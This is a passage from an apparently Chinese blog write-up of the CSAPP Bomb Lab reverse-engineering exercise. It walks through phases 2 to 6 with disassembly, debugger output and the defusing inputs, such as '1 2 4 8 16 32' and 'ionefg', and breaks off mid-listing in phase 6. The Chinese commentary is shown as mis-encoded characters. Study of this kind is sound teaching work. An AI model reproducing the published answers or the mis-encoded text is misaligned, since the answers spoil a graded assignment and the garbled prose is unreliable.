\u003cexplode_bomb\u003e 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 \u003cphase_2+0x1b\u003e 400f2e: eb 0c jmp 400f3c \u003cphase_2+0x40\u003e 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 \u003cphase_2+0x1b\u003e 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq å°†æ ˆå¢é•¿ï¼Œä¼ å…¥rsiã€‚ 000000000040145c \u003cread_six_numbers\u003e: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 \u003cread_six_numbers+0x3d\u003e 401494: e8 a1 ff ff ff callq 40143a \u003cexplode_bomb\u003e 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq è¿™é‡Œåˆå°†æ ˆå¢é•¿ï¼Œå°†rsiå³åŸæ¥çš„æ ˆé¡¶åœ°å€ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ç»™äº†rdxï¼Œåç§»+4ä½œä¸ºç¬¬å››ä¸ªå‚æ•°ç»™äº†rcxï¼ŒåŒç†ï¼Œç¬¬äº”ä¸ªå‚æ•°åœ¨r8ï¼Œç¬¬å…­ä¸ªå‚æ•°åœ¨r9ã€‚å¦‚æœå¯„å­˜å™¨ä¸å¤Ÿä¼ å‚ï¼Œä¼šå°†å‚æ•°å…¥æ ˆã€‚åˆ†æç¬¬5-8è¡Œï¼Œåç§»+0x10çš„ç¬¬ä¸ƒä¸ªå‚æ•°ï¼Œå’Œ+0x14çš„ç¬¬å…«ä¸ªå‚æ•°å…¥æ ˆäº†ã€‚ ä¹‹åè°ƒç”¨äº†sscanfï¼šint sscanf(const char *str, const char *format, ...)ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œå³æ•°æ®æºã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯0x4025c3å¤„çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚sscanfæ˜¯å°†æ•°æ®æºæŒ‰ç…§æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œç»™åé¢çš„å‚æ•°èµ‹å€¼ã€‚æŸ¥çœ‹æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š pwndbg\u003e print (char *) 0x4025c3 $1 = 0x4025c3 \"%d %d %d %d %d %d\" æ‰€ä»¥æˆ‘ä»¬å°±æ˜¯è¦è¾“å…¥å…­ä¸ªæ•°å­—ï¼Œä¸­é—´ä»¥ç©ºæ ¼åˆ†éš”ã€‚æœ€åæ¸…æ ˆè¿”å›ã€‚ 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 \u003cphase_2+0x34\u003e 400f10: e8 25 05 00 00 callq 40143a \u003cexplode_bomb\u003e è¿™æ—¶rspæŒ‡å‘äº†ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œcmpl $0x1,(%rsp)ä¸1è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰åˆ™è·³è½¬ï¼š 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 \u003cphase_2+0x1b\u003e rspä¸Šç§»4çš„åœ°å€ï¼Œç»™äº†rbxï¼Œè¿™æ—¶rbxæŒ‡å‘ç¬¬äºŒä¸ªå‚æ•°ã€‚rspä¸Šç§»0x18çš„åœ°å€ï¼Œç»™äº†rbpï¼Œè¿™æ—¶rbpæŒ‡å‘äº†æœ€åä¸€ä¸ªå‚æ•°çš„åé¢çš„åœ°å€ã€‚æœ€åè·³å›ï¼š 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 \u003cphase_2+0x29\u003e 400f20: e8 15 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 \u003cphase_2+0x1b\u003e 400f2e: eb 0c jmp 400f3c \u003cphase_2+0x40\u003e ç¬¬ä¸€ä¸ªå‚æ•°*2ä¸ç¬¬äºŒä¸ªå‚æ•°æ¯”è¾ƒï¼Œä¸ç›¸ç­‰å°±çˆ†ç‚¸ï¼Œç›¸ç­‰å°±ä¼šè·³åˆ°ç¬¬6è¡Œçš„ä½ç½®ã€‚å°†rbxåœ°å€+4ï¼Œå¹¶ä¸rbpè¿›è¡Œæ¯”è¾ƒã€‚è¿™é‡Œrbxå°±åˆæŒ‡å‘äº†ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œç„¶åè·³å›ï¼Œé‡å¤ä¸Šé¢çš„æ“ä½œï¼ŒçŸ¥é“æ¯”è¾ƒå®Œäº†æ‰€æœ‰çš„å‚æ•°ï¼Œrbp==rbxã€‚æ‰€ä»¥ï¼Œé™¤äº†ç¬¬ä¸€ä¸ªå‚æ•°ä¸º1ï¼Œå…¶ä½™å‚æ•°éƒ½æ˜¯å‰é¢å‚æ•°çš„äºŒå€ã€‚åˆ™ç»“æœä¸ºï¼š 1 2 4 8 16 32 ","date":"2021-01-31","objectID":"/csapp-bomblab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_2"},{"categories":["Pwning"],"content":"phase_3 0000000000400f43 \u003cphase_3\u003e: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a \u003cphase_3+0x27\u003e 400f65: e8 d0 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad \u003cphase_3+0x6a\u003e 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax 400f81: eb 3b jmp 400fbe \u003cphase_3+0x7b\u003e 400f83: b8 c3 02 00 00 mov $0x2c3,%eax 400f88: eb 34 jmp 400fbe \u003cphase_3+0x7b\u003e 400f8a: b8 00 01 00 00 mov $0x100,%eax 400f8f: eb 2d jmp 400fbe \u003cphase_3+0x7b\u003e 400f91: b8 85 01 00 00 mov $0x185,%eax 400f96: eb 26 jmp 400fbe \u003cphase_3+0x7b\u003e 400f98: b8 ce 00 00 00 mov $0xce,%eax 400f9d: eb 1f jmp 400fbe \u003cphase_3+0x7b\u003e 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax 400fa4: eb 18 jmp 400fbe \u003cphase_3+0x7b\u003e 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe \u003cphase_3+0x7b\u003e 400fad: e8 88 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe \u003cphase_3+0x7b\u003e 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 \u003cphase_3+0x86\u003e 400fc4: e8 71 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq è¿™é‡ŒåŒæ ·è°ƒç”¨äº†sscanfï¼ŒæŸ¥çœ‹æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š pwndbg\u003e print (char *) 0x4025cf $1 = 0x4025cf \"%d %d\" æœ€åè¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾å…¥äº†rsp+8ï¼Œç¬¬äºŒä¸ªå‚æ•°æ”¾å…¥rsp+0xcã€‚è¿”å›åeaxä¸1è¿›è¡Œæ¯”è¾ƒï¼Œåˆ¤æ–­æ˜¯å¦è¾“å…¥äº†ä¸¤ä¸ªæ•°ï¼Œå¦åˆ™çˆ†ç‚¸ã€‚ç„¶åç¬¬ä¸€ä¸ªå‚æ•°ä¸7æ¯”è¾ƒï¼Œåˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦è¶…è¿‡äº†7ï¼Œå¦åˆ™çˆ†ç‚¸ã€‚ ä¹‹åå°†ç¬¬ä¸€ä¸ªå‚æ•°æ”¾å…¥eaxï¼Œå¹¶è·³è½¬åˆ°0x402470+8*raxå¤„ã€‚æˆ‘ä»¬çœ‹çœ‹0x402470æœ‰å­˜æ”¾çš„åœ°å€æ˜¯ä»€ä¹ˆï¼š pwndbg\u003e x/16x 0x402470 0x402470: 0x00400f7c 0x00000000 0x00400fb9 0x00000000 0x402480: 0x00400f83 0x00000000 0x00400f8a 0x00000000 0x402490: 0x00400f91 0x00000000 0x00400f98 0x00000000 0x4024a0: 0x00400f9f 0x00000000 0x00400fa6 0x00000000 æ¯ä¸ªåœ°å€éƒ½å¯¹åº”äº†mov $xxx,%eaxï¼Œå³æ ¹æ®ç¬¬ä¸€ä¸ªå‚æ•°è·³è½¬åˆ°ä¸åŒçš„åœ°å€ï¼Œç»™eaxèµ‹å€¼ï¼Œæœ€ååˆ°0x400beæ¯”è¾ƒç¬¬äºŒä¸ªå‚æ•°ä¸eaxã€‚æ‰€ä»¥åªè¦è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯¹åº”çš„å°±å¯ä»¥ã€‚ç­”æ¡ˆä»¥ä¸‹å…¶ä¸€ï¼š 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 ","date":"2021-01-31","objectID":"/csapp-bomblab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_3"},{"categories":["Pwning"],"content":"phase_4 000000000040100c \u003cphase_4\u003e: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 \u003cphase_4+0x29\u003e 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a \u003cphase_4+0x2e\u003e 401035: e8 00 04 00 00 callq 40143a \u003cexplode_bomb\u003e 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce \u003cfunc4\u003e 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 \u003cphase_4+0x4c\u003e 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d \u003cphase_4+0x51\u003e 401058: e8 dd 03 00 00 callq 40143a \u003cexplode_bomb\u003e 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq åˆä¸€ä¸ªsscanfï¼Œè·Ÿç¬¬ä¸‰å…³æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ä¸€æ ·ã€‚ è¿”å›åæ¯”è¾ƒeaxä¸2ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦è¾“å…¥äº†ä¸¤ä¸ªï¼Œå¦åˆ™è·³è½¬åˆ°ç‚¸å¼¹å¤„ã€‚ç„¶ååˆ¤æ–­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦å°äºç­‰äº14ï¼Œå¦åˆ™çˆ†ç‚¸ã€‚ä¹‹åè°ƒç”¨func4,ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º0ï¼Œç¬¬ä¸‰ä¸ªä¸º14ã€‚ 0000000000400fce \u003cfunc4\u003e: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 \u003cfunc4+0x24\u003e 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce \u003cfunc4\u003e 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 \u003cfunc4+0x39\u003e 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 \u003cfunc4+0x39\u003e 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce \u003cfunc4\u003e 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq ç¬¬ä¸‰ä¸ªå‚æ•°æ”¾å…¥eaxåå‡å»ç¬¬äºŒä¸ªå‚æ•°ï¼Œæœ€åæ”¾å…¥äº†ecxã€‚ç„¶åé€»è¾‘å·¦ç§»31ä½ï¼Œå†åŠ ä¸ŠåŸæ¥çš„æ•°ï¼Œæœ€åç®—æœ¯å³ç§»ä¸€ä½ï¼Œæ”¾å…¥eaxã€‚ç„¶åecx=rax+rsiï¼Œå‡è®¾func4(int a,int b,int c)ï¼Œé‚£ä¹ˆä¸Šè¿°æŒ‡ä»¤ç›¸å½“äº(c-b)/2+bã€‚æœ¬é¢˜æ¥è¯´å°±æ˜¯7ã€‚ ä¹Ÿå°±æ˜¯7è¢«æ”¾å…¥äº†ecxã€‚ç„¶åæ¯”è¾ƒç¬¬ä¸€ä¸ªå‚æ•°aä¸7çš„å¤§å°ï¼Œåˆ¤æ–­æ˜¯å¦7å°äºç­‰äºaã€‚ è‹¥æ˜¯ï¼Œeaxè¢«èµ‹å€¼ä¸º0ï¼Œå†æ¬¡æ¯”è¾ƒaä¸7ï¼Œè¿™é‡Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ²¡æœ‰æ”¹å˜æ‰€ä»¥å¿…ç„¶ä¼šè·³è½¬ï¼Œæœ€åé€€å‡ºï¼Œè¿”å›å€¼ä¸º0ã€‚ ä»è¿™ä¸ªåˆ†æ”¯ç»§ç»­åˆ†æï¼Œè¿”å›ä¹‹åtest eax,eaxï¼Œå› ä¸ºeax=0ï¼Œæ‰€ä»¥ZF=1ï¼Œä¸ä¼šè·³è½¬ï¼Œç„¶åæ¯”è¾ƒæˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ä¸0ï¼Œç›¸ç­‰å°±ä¼šé€€å‡ºï¼Œå¦åˆ™çˆ†ç‚¸ã€‚ æ‰€ä»¥7 0æ˜¯ä¸€ä¸ªç­”æ¡ˆã€‚ è‹¥å¦ï¼Œ7-1è¢«èµ‹å€¼ç»™äº†edxï¼Œå†æ¬¡è°ƒç”¨äº†func4ã€‚ ç»è¿‡ä¸Šé¢çš„åˆ†æåªè¦è®©func4æœ€åçš„è¿”å›å€¼ä¸º0å°±å¯ä»¥ã€‚æ‰€ä»¥æˆ‘ä»¬åˆ†æä¸€ä¸‹ï¼Œè‹¥a\u003c7æ—¶ï¼Œè¾“å…¥ä½•å€¼æ‰èƒ½ä½¿æ¡ä»¶æˆç«‹ã€‚ (c-b)/2+b-1ï¼Œå³6ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä½™å‚æ•°æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚æ­¤æ—¶6/2=3ï¼Œå³a=3ï¼Œä½¿æ¡ä»¶æˆç«‹ã€‚ç¬¬äºŒå±‚è¿”å›åˆ°ç¬¬ä¸€å±‚ï¼Œ0*2=0ï¼Œè¿”å›ï¼Œæ¡ä»¶æˆç«‹ã€‚ å¦åˆ™ï¼Œç»§ç»­è°ƒç”¨ï¼Œæ­¤æ—¶3-1=2ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ã€‚2/2=1ï¼Œa=1ï¼Œæ¡ä»¶æˆç«‹ã€‚ å¦åˆ™ï¼Œa=0ï¼Œæ¡ä»¶æˆç«‹ã€‚ ç­”æ¡ˆä¸ºä»¥ä¸‹å…¶ä¸€ï¼š 7 0 3 0 1 0 0 0 ","date":"2021-01-31","objectID":"/csapp-bomblab/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_4"},{"categories":["Pwning"],"content":"phase_5 0000000000401062 \u003cphase_5\u003e: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b \u003cstring_length\u003e 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 \u003cphase_5+0x70\u003e 401084: e8 b1 03 00 00 callq 40143a \u003cexplode_bomb\u003e 401089: eb 47 jmp 4010d2 \u003cphase_5+0x70\u003e 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b \u003cphase_5+0x29\u003e 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 \u003cstrings_not_equal\u003e 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 \u003cphase_5+0x77\u003e 4010c6: e8 6f 03 00 00 callq 40143a \u003cexplode_bomb\u003e 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 \u003cphase_5+0x77\u003e 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b \u003cphase_5+0x29\u003e 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee \u003cphase_5+0x8c\u003e 4010e9: e8 42 fa ff ff callq 400b30 \u003c__stack_chk_fail@plt\u003e 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq ç«Ÿç„¶æœ‰canary~ rbxä¿å­˜å…¥æ ˆï¼Œæ ˆå¢é•¿0x20ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²å­˜å…¥rbxï¼Œæ”¾canaryï¼Œeaxæ¸…é›¶ï¼Œè°ƒç”¨string_lengthã€‚æœ€åè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¹¶ä¸6è¿›è¡Œæ¯”è¾ƒï¼Œä¸ç›¸ç­‰å°±çˆ†ç‚¸ã€‚æ‰€ä»¥è¦è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²ã€‚ ç„¶åå°†eaxèµ‹å€¼ä¸º0ï¼Œç„¶åå­—ç¬¦ä¸²çš„æœ€ä½å­—èŠ‚æ”¾å…¥ecxä¸­ï¼Œç„¶åå…¥æ ˆï¼Œæœ€åæ”¾å…¥rdxï¼Œå†ä¸ä¸Š0xfã€‚æœ€åå–ä½å››ä½æ”¾å…¥äº†edxã€‚ ä¹‹åå°†è¿™ä½å››ä½åŠ ä¸Š0x4024b0çš„å’Œçš„æœ€ä½å­—èŠ‚ï¼Œæ”¾å…¥edx,æœ€ååˆå°†å…¶æ”¾å…¥æ ˆä¸­ï¼Œcanaryä¹‹ä¸‹ã€‚rax+1ï¼Œä¸6è¿›è¡Œæ¯”è¾ƒï¼Œä¸ç›¸ç­‰å°±é‡å¤ä¸Šé¢çš„æ“ä½œã€‚ç›´åˆ°å‘æ ˆä¸­æ”¾å…¥äº†6ä¸ªå­—ç¬¦ï¼Œæœ€åç”¨â€™\\x00â€˜è¿›è¡Œæˆªæ–­ã€‚ ç„¶åè°ƒç”¨strings_not_equalæ¯”è¾ƒå­˜å…¥å­—ç¬¦ä¸²ï¼Œä¸0x40245eå¤„çš„å­—ç¬¦ä¸²ã€‚ç›¸ç­‰åˆ™é€€å‡ºï¼Œä¸ç›¸ç­‰å°±çˆ†ç‚¸ã€‚æŸ¥çœ‹0x40245eå¤„çš„å­—ç¬¦ä¸²ï¼š pwndbg\u003e x /s 0x40245e 0x40245e: \"flyers\" æŸ¥çœ‹0x4024b0å¤„å­—ç¬¦ä¸²ï¼š pwndbg\u003e x /s 0x4024b0 0x4024b0 \u003carray.3449\u003e: \"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\" è¿™é‡Œå…¶å®åªè¦maduiersnfotvbyï¼Œå› ä¸ºå››ä½äºŒè¿›åˆ¶æ•°çš„èŒƒå›´ä¸º0-15ã€‚è®¡ç®—ä¸€ä¸‹6ä¸ªåç§»ï¼š 9 f e 5 6 7 æ‰€ä»¥åªè¦ä½å››ä½å¯¹åº”ä¸Šé¢è¿™äº›éƒ½å¯ä»¥ï¼Œå‚è€ƒç­”æ¡ˆï¼š ionefg/IONEFG ","date":"2021-01-31","objectID":"/csapp-bomblab/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_5"},{"categories":["Pwning"],"content":"phase_6 00000000004010f4 \u003cphase_6\u003e: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c \u003cread_six_numbers\u003e è°ƒç”¨äº†read_six_numbersï¼Œæ ¹æ®ä¹‹å‰çš„åˆ†ææˆ‘ä»¬è¦è¾“å…¥å…­ä¸ªæ•°å­—ã€‚ 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 \u003cphase_6+0x34\u003e ;0x401128 401123: e8 12 03 00 00 callq 40143a \u003cexplode_bomb\u003e 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 \u003cphase_6+0x5f\u003e ;0x401153 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 \u003cphase_6+0x51\u003e ;0x401145 401140: e8 f5 02 00 00 callq 40143a \u003cexplode_bomb\u003e 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 \u003cphase_6+0x41\u003e ;0x401135 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 \u003cphase_6+0x20\u003e ;0x401114 è¿™é‡Œr13æŒ‡å‘äº†æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ã€‚ç¬¬ä¸€ä¸ªæ•°å­—-1ä¸5è¿›è¡Œæ¯”è¾ƒï¼Œå¤§äº5å°±çˆ†ç‚¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°è¦å°äºç­‰äº6ã€‚ ç„¶år12d+1ï¼Œä¸6è¿›è¡Œæ¯”è¾ƒï¼Œç¬¬ä¸€æ¬¡æ¯”è¾ƒr12dä¸º0ã€‚æ— è®ºæ€æ ·ï¼Œæˆ‘ä»¬å…ˆè€ƒè™‘ä¸ç›¸ç­‰çš„æƒ…å†µã€‚ å°†r12då½“ä½œç´¢å¼•æ”¾å…¥äº†raxï¼Œä¹‹åæ¯”è¾ƒrsp+4*raxä¸rbpï¼Œå³ç¬¬ä¸€ä¸ªå‚æ•°ä¸ç¬¬äºŒä¸ªå‚æ•°ï¼Œç›¸ç­‰å°±ä¼šçˆ†ç‚¸ã€‚ç„¶åï¼Œåˆ¤æ–­ebxå³åŸæ¥çš„r12dä¸­çš„å€¼+1åæ˜¯å¦å°äºç­‰äº5ã€‚ å¦‚æœå°äºå°±ä¼šè·³å›ï¼Œebxæ”¾å…¥raxä½œä¸ºç´¢å¼•ã€‚è¿™é‡Œebxå·²ç»è¢«åŠ äº†1ã€‚æ‰€ä»¥å¯ä»¥åˆ†æå‡ºè¿™æ˜¯ä¸€ä¸ªforå¾ªç¯ç”¨æ¥åˆ¤æ–­ï¼Œç¬¬ä¸€ä¸ªæ•°ä¸ä¹‹åçš„æ•°æ˜¯å¦ç›¸ç­‰ã€‚ ä¹‹år13+4æŒ‡å‘äº†æˆ‘ä»¬çš„ç¬¬äºŒä¸ªæ•°ï¼Œç„¶ååˆæ¯”è¾ƒäº†ç¬¬äºŒä¸ªæ•°ä¸6çš„å¤§å°ã€‚ç„¶åï¼ŒæŠŠç¬¬äºŒä¸ªå‚æ•°å•ä½œç¬¬ä¸€ä¸ªæ•°ï¼Œè¿›è¡Œä¸Šè¿°æ“ä½œã€‚ æ‰€ä»¥ï¼Œé€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬è¾“å…¥çš„å…­ä¸ªæ•°è¦å°äºç­‰äº6ï¼Œä¸”ä¸¤ä¸¤ä¸ç›¸ç­‰ã€‚ 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 \u003cphase_6+0x6c\u003e ;0x401160 lea 0x18(%rsp),%rsiå°†æ•°ç»„æœ«å°¾åœ°å€ç»™äº†rsiã€‚å°†r14ä¸­çš„æ•°ç»„é¦–å€æ”¾å…¥raxä¸­ï¼Œæœ€åå®ç°ï¼š7-å‚æ•°ã€‚ç„¶ååˆ¤æ–­ï¼Œæ˜¯å¦åˆ°äº†æ•°ç»„å°¾éƒ¨ã€‚æ‰€ä»¥è¿™æ®µå®ç°äº†7-num[i]ã€‚ 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 \u003cphase_6+0xa3\u003e ;0x401197 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 \u003cphase_6+0x82\u003e ;0x401176 401181: eb 05 jmp 401188 \u003cphase_6+0x94\u003e ;0x401188 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab \u003cphase_6+0xb7\u003e ;0x4011ab 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 